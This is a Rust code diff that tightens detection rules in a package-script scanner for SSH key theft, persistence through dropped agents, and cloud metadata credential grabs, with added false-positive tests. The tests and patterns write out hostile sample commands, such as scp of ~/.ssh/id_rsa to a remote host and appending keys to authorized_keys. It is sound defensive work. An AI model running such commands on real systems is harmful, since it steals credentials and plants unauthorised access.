@@ -1816,11 +1816,17 @@ pub fn get_builtin_rules() -> Vec<Rule> {
                 Pattern::Regex {
                     pattern: r"/tmp/linux-x86_64/agent\b".to_string(),
                 },
+                // systemd-run + Agent-Pfad in derselben Zeile (nicht standalone,
+                // da `systemd-run --user --scope` legitime User-Tools nutzen).
                 Pattern::Regex {
-                    pattern: r"systemd-run\s+--user\s+--scope".to_string(),
+                    pattern: r"systemd-run\s+--user\s+--scope[^\n]*(/tmp/linux-x86_64/agent|/dev/shm/\.agent|\.bin)"
+                        .to_string(),
                 },
+                // loginctl enable-linger nur zusammen mit einem Agent-Pfad (Standalone
+                // ist eine gängige legitime Methode für User-Services beim Boot).
                 Pattern::Regex {
-                    pattern: r"loginctl\s+enable-linger".to_string(),
+                    pattern: r"loginctl\s+enable-linger[^\n]*(/tmp/linux-x86_64/agent|/dev/shm/\.agent|/tmp/tb)"
+                        .to_string(),
                 },
             ],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
@@ -1868,20 +1874,33 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::Critical,
             category: Category::CredentialTheft,
             patterns: vec![
+                // Key-Lesen + Weitergabe/Exfil in derselben logischen Zeile. Kein
+                // standalone-Match: `ssh-keygen`/`ssh-keyscan >> known_hosts`/
+                // `install -Dm644 authorized_keys` sind legitime Fälle.
                 Pattern::Regex {
-                    pattern: r"~?/\.ssh/(id_rsa|id_ecdsa|id_ed25519)\b".to_string(),
+                    pattern: r"(~?/\.ssh/(id_rsa|id_ecdsa|id_ed25519)\b)[^\n]*(scp|tar|base64|curl|wget|nc|ssh\s+-|cat|>|>>)"
+                        .to_string(),
                 },
                 Pattern::Regex {
-                    pattern: r"authorized_keys".to_string(),
+                    pattern: r"(scp|nc|curl|wget)\s+[^\n]*~?/\.ssh/(id_rsa|id_ecdsa|id_ed25519)"
+                        .to_string(),
+                },
+                // authorized_keys-Exfil/Injektion: Schreib-Zugriff (>>, >, install)
+                // kombiniert mit einem Key-Quellpfad ODER ssh-rsa/ed25519-Pubkey, in
+                // beliebiger Reihenfolge innerhalb der Zeile.
+                Pattern::Regex {
+                    pattern: r"(authorized_keys)[^\n]*(>>|>|install)[^\n]*(id_rsa|id_ecdsa|id_ed25519|ssh-rsa|ssh-ed25519)"
+                        .to_string(),
                 },
                 Pattern::Regex {
-                    pattern: r"known_hosts".to_string(),
+                    pattern: r"(ssh-rsa|ssh-ed25519|id_rsa|id_ecdsa|id_ed25519)[^\n]*(>>|>|install)[^\n]*authorized_keys"
+                        .to_string(),
                 },
+                // ssh mit BatchMode/StrictHostKeyChecking NOCH KEIN Beweis — nur wenn
+                // damit gleichzeitig ein Key/eine Datei an einen entfernten Host geht.
                 Pattern::Regex {
-                    pattern: r"ssh\s+.*(BatchMode|StrictHostKeyChecking)".to_string(),
-                },
-                Pattern::Regex {
-                    pattern: r"scp\s+.*(id_rsa|id_ecdsa|id_ed25519)".to_string(),
+                    pattern: r"(ssh\s+-o[^\n]*(BatchMode|StrictHostKeyChecking)[^\n]*\b(>|scp|echo)\b)"
+                        .to_string(),
                 },
             ],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
@@ -1897,17 +1916,18 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::Critical,
             category: Category::CredentialTheft,
             patterns: vec![
+                // Metadaten-Endpoint nur zusammen mit einem aktiven Fetch-Kommando
+                // (curl|wget|nc|exec|python|go|node). Die IP allein ist harmlos und
+                // kann in legitimen Cloud/Netzwerk-Tools auftauchen.
                 Pattern::Regex {
-                    pattern: r"169\.254\.169\.254".to_string(),
+                    pattern: r"(curl|wget|nc|fetch|exec|python|go\s+run|node)\s+[^\n]*(169\.254\.169\.254|169\.254\.170\.2)"
+                        .to_string(),
                 },
                 Pattern::Regex {
-                    pattern: r"169\.254\.170\.2".to_string(),
+                    pattern: r"(curl|wget|nc|fetch|exec)\s+[^\n]*metadata\.google\.internal".to_string(),
                 },
                 Pattern::Regex {
-                    pattern: r"metadata\.google\.internal".to_string(),
-                },
-                Pattern::Regex {
-                    pattern: r"latest/meta-data".to_string(),
+                    pattern: r"(curl|wget|nc|fetch)\s+[^\n]*latest/meta-data".to_string(),
                 },
             ],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
@@ -3189,13 +3209,30 @@ mod tests {
         for s in [
             "tar xzf /dev/shm/.agent.bin -C /tmp",
             "/tmp/linux-x86_64/agent",
-            "systemd-run --user --scope --unit=weird agent",
-            "loginctl enable-linger",
+            "systemd-run --user --scope --unit=weird /tmp/linux-x86_64/agent",
+            "loginctl enable-linger && /tmp/linux-x86_64/agent",
         ] {
             let m = engine.match_content(s, FileType::InstallScript);
             assert!(
                 m.iter().any(|x| x.rule_id == "ATOMIC-007"),
                 "ATOMIC-007 missed stage-2 drop: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_atomic007_no_fp_on_legit_systemd_linger() {
+        // Legitimate user-service boot methods must NOT fire ATOMIC-007 standalone.
+        let engine = RuleEngine::default();
+        for s in [
+            "systemd-run --user --scope --unit=backup myservice",
+            "loginctl enable-linger",
+            "systemctl --user enable --now myuser.service",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "ATOMIC-007"),
+                "ATOMIC-007 false positive on legit systemd usage: {s} -> {m:?}"
             );
         }
     }
@@ -3255,14 +3292,32 @@ mod tests {
         let engine = RuleEngine::default();
         for s in [
             "cat ~/.ssh/id_rsa > /tmp/keys && scp /tmp/keys root@host:/tmp/",
-            "ssh -o BatchMode=yes -o StrictHostKeyChecking=no root@192.168.1.5 'echo deployed'",
-            "cat ~/.ssh/known_hosts",
+            "scp ~/.ssh/id_rsa root@host:/tmp/",
+            "cat ~/.ssh/id_rsa | base64",
             "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
         ] {
             let m = engine.match_content(s, FileType::InstallScript);
             assert!(
                 m.iter().any(|x| x.rule_id == "ATOMIC-009"),
                 "ATOMIC-009 missed SSH worm: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_atomic009_no_fp_on_legit_ssh_usage() {
+        // Legitimate SSH/CI usage must NOT fire ATOMIC-009 standalone.
+        let engine = RuleEngine::default();
+        for s in [
+            "ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519",
+            "ssh-keyscan github.com >> ~/.ssh/known_hosts",
+            "install -Dm644 authorized_keys /etc/ssh/authorized_keys",
+            "ssh -o StrictHostKeyChecking=no -o BatchMode=yes root@host 'deploy'",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "ATOMIC-009"),
+                "ATOMIC-009 false positive on legit SSH usage: {s} -> {m:?}"
             );
         }
     }
@@ -3279,6 +3334,23 @@ mod tests {
             assert!(
                 m.iter().any(|x| x.rule_id == "ATOMIC-010"),
                 "ATOMIC-010 missed cloud metadata exfil: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_atomic010_no_fp_on_metadata_reference() {
+        // Referencing the metadata IP without fetching (config, docs) must NOT fire.
+        let engine = RuleEngine::default();
+        for s in [
+            "METADATA_IP=169.254.169.254",
+            "# the cloud metadata endpoint is 169.254.169.254",
+            "ip addr show | grep 169.254.169.254",
+        ] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "ATOMIC-010"),
+                "ATOMIC-010 false positive on metadata reference: {s} -> {m:?}"
             );
         }
     }
